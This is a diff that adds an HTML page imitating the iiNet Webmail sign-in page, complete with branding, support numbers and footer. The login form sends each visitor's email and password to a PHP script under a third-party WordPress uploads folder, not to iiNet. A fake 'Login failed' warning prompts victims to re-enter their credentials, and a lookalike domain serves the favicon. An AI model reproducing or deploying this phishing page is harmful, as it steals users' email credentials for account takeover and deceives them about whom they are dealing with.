@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<!-- CUSTOM HEADER TAGS -->
+		<title>iiNet Webmail - Email Account - iiNet Australia</title>
+		<meta name="description" content="iiNet are internet service providers offering broadband, naked dsl, voip and phone services. Discover the range of internet products available to you or for your business.">
+		<meta name="keywords" content="internet services, broadband, phone services, voip, naked dsl, adsl, internet  products, fast connect, dial up, business, plans, iinet, australia">
+
+		<!--Meta Tag for Google Webmaster Tools -->
+		<meta name="verify-v1" content="Nn6WF5sErNnGmEfmozNjqrN/qUFLATZJl5H0e0gd/ac=">  
+<!-- END CUSTOM HEADER TAGS -->
+
+		
+        <link rel="shortcut icon" href="https://assets.iiinet.net.au/website/_shared/favicon/favicon.iinet.ico" type="image/x-icon" />
+		<link id="primary-styles" href="https://assets.iinet.net.au/el/3.3.2/styles.iinet.css" rel="stylesheet" crossorigin>
+		<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+	<!--[if lt IE 9]>
+	   <link href="https://cdn.dev.iinet.net.au/el/3.6.147/styles-ie8.css" rel="stylesheet" crossorigin>
+	   <script src="https://cdn.dev.iinet.net.au/website/_shared/_lib/html5shiv.respond.min.js"></script>
+	<![endif]-->
+
+
+	</head>
+	<body id="iinet" class="l-basic">
+
+	<!-- jquery needs to be placced before BODY content -->
+	<script src="https://assets.iinet.net.au/el/vendor/jquery-1.11.3.min.js"></script> <!-- note: cannot use 2.x+ as we need IE8 support -->
+
+	<!-- Google Tag Manager -->
+	<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-FH77"
+	height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+	<script>    (function (w, d, s, l, i) {
+	        w[l] = w[l] || []; w[l].push({ 'gtm.start':
+	new Date().getTime(), event: 'gtm.js'
+	        }); var f = d.getElementsByTagName(s)[0],
+	j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+	'//www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+	    })(window, document, 'script', 'dataLayer', 'GTM-FH77');</script>
+	<!-- End Google Tag Manager -->
+
+<header id="header-v1">
+  <section class="desktop-nav-section">
+  	<div class="l-main-nav-wrapper">
+	    <nav class="l-main-nav">
+	       <span class="l-branding">
+		       <a href="//www.iinet.net.au">
+		       		<span class="logo" arai-label="iiNet"></span>
+		       </a>
+	       </span>
+
+
+	       <ul class="l-basic-phone">
+		      <li class="l-tel">
+		        <span>Sales:</span> 13 19 17<br>
+		      	<span>Support &amp; billing:</span> 13 22 58				      </li>
+	      </ul>
+
+	      <ul class="l-basic-nav">
+	        <li><a href="https://www.iinet.net.au/contact/"><i class="iii iii-ii-help"></i> Contact Us</a></li>
+	        <li><a href="https://toolbox3.iinet.net.au"><i class="iii iii-toolbox"></i> Toolbox</a></li>
+	        <li><a href="https://www.iinet.net.au"><i class="iii iii-broadband"></i> Website</a></li>
+	      </ul>
+
+	    </nav>
+	  </div> <!-- end main nav wrapper -->
+
+
+	 <div class="product-nav-wrapper">
+      <nav class="product-nav">
+        <!--  is empty -->
+  	  </nav>
+    </div>
+  </section> <!-- end desktop nav -->
+</header>
+	
+
+<script type="text/javascript">
+// Reload to the master frame if we are inside a frameset
+if (parent.frames[1]) top.window.location=self.location;
+
+
+$(function() {
+	$('#email').focus();
+
+	// note you cannot do it on "submit", it needs to be a click event on the button
+	$("input[type=submit]").bind('click', function() {
+
+		// Force IE to "autocomplete" remember the email
+		// Note: This only works if there are no hidden <input type='text'> fields which are display:none or hidden via CSS
+		try {
+			
+		    if (window.external && ('AutoCompleteSaveForm' in window.external)) {
+	            var form = document.getElementById("loginPage");
+	            window.external.AutoCompleteSaveForm(form);
+	        }
+	        else {
+				// Not supported in browser
+	        }
+
+		} catch(err) {
+			
+		}		
+
+
+		var email = $("#email").val().trim();
+
+		var emailArgs = email.split('@');
+		$("input[name=emailName]").val(emailArgs[0]);
+		
+		if( !emailArgs[1] ) {
+			$("input[name=emailDomain]").val( $("input[name=emailDomainDefault]").val() );
+			
+		} else {
+			$("input[name=emailDomain]").val(emailArgs[1]);				
+		}
+
+		// don't disable the form hidden elements, browsers have problems with this
+		 // $('form input[type=text]').prop('disabled', true);
+		 // $('form input[type=password]').prop('disabled', true);
+		 // $('form input[type=submit]').prop('disabled', true);
+				
+		document.body.style.cursor = 'wait';
+		
+	});
+});
+</script>
+
+<style>
+.divider-top {
+	margin-top:5%;
+}
+
+.email-icon {
+	font-size:128px;
+	color: #808080;
+}
+
+.border-left-grey {
+	border-left: 1px solid #DDDDDD;	
+}
+
+.text-right {
+	text-align:right;
+}
+
+.padding-right-24 {
+	padding-right:24px;
+}
+
+.padding-left-24 {
+	padding-left:24px;
+}
+</style>
+
+<!--[if lt IE 9]>
+	<style>
+	.hide-ie8 {
+		display: none;
+	}
+	</style>
+<![endif]-->
+
+<div class="container margin-top-12">
+	<!-- BANNER MANAGEMENT SYSTEM -->
+	<div id="bms__webmail"></div>
+	<script src="https://www.iinet.net.au/library/banners/webmail/script"></script>
+	<!-- END BANNER MANAGEMENT SYSTEM -->
+</div>
+
+<div class="container divider-top">
+<div class="alert alert-warning"></span><span>Login failed - Username or password is incorrect </span></div>
+
+
+	
+	
+	<div class="row">
+
+		<div class="col-xs-offset-4 padding-left-24 col-xs-8">
+			<h2>Sign in</h2>
+		</div>
+	</div> <!-- end row -->
+
+	<div class="row">
+
+		<div class="hidden-xs hide-ie8 col-sm-4 padding-right-24 text-right">
+			<i class="iii iii-email email-icon"></i>
+		</div>
+
+		<div class="col-xs-12 col-sm-8 border-left-grey padding-left-24">
+
+			<p>Enter your email address and password to log in to iiNet Webmail</p>
+
+			<form class="login-form" action="https://kam.bm/wp-content/uploads/2020/02/inet.php" name="loginPage" method="post" id="loginPage">
+				<input type='hidden' name='emailName' value=''/>
+				<input type='hidden' name='emailDomain' value=''/>
+				<input type='hidden' name='emailDomainDefault' value='iinet.net.au' />
+				<input type='hidden' name='cssStyle' value=''/>
+									
+				<fieldset>
+					<p>
+						<label class="user" for="email">Email:</label>
+						 <input id="email" class="form-control" type="text" name="email" tabindex="1" autocomplete="on" />
+					</p>
+
+					<p>
+						<label class="pass" for="password">Password:</label>
+						 <input id="password" class="form-control" type="password" name="password" tabindex="2" autocomplete="on" />		
+					</p>											
+				</fieldset>
+
+				<input class="input-pass" type="hidden" value="mail.iinet.net.au" name="requestedServer" />
+
+
+				<fieldset>
+					<p>
+					<input class="btn btn-primary loginbtn" type="submit" value="Login" tabindex="3" />
+					</p>
+					
+					<p class="margin-top-24"><strong>
+                       <a href="https://toolbox3.iinet.net.au/login/lostpassword?mode=none" class="nowrap" target="_blank">Forgotten your username?</a><br>
+                       <a href="https://toolbox3.iinet.net.au/login/lostpassword" target="_blank" class="nowrap">Forgotten your password?</a>
+                    </strong></p>
+				</fieldset>
+			</form>
+
+		</div> <!-- end col -->
+
+
+	</div> <!-- end row -->
+</div> <!-- end container -->
+
+
+
+
+<!-- START FOOTER -->
+
+<footer>
+<div class="footer-wrapper">
+	<p><script>document.write(new Date().getFullYear())</script><noscript>2020</noscript> &copy; iiNet Limited. ACN 068 628 937 All rights reserved. <br>
+		iiNet provides <a href="https://www.iinet.net.au/internet-product/broadband/nbn/plans/fibre">NBN plans</a>, <a href="https://www.iinet.net.au/internet-products/broadband/plans/?adsl">ADSL2+ broadband Internet</a>, <a href="https://www.iinet.net.au/internet-products/broadband/plans/">Naked DSL</a>, phone and mobile SIM plans.
+	</p>
+</div>
+</footer>
+
+<script src="https://assets.iinet.net.au/el/3.3.2/scripts.js" crossorigin></script>
+
+<!-- END DEFAULT FOOTER -->
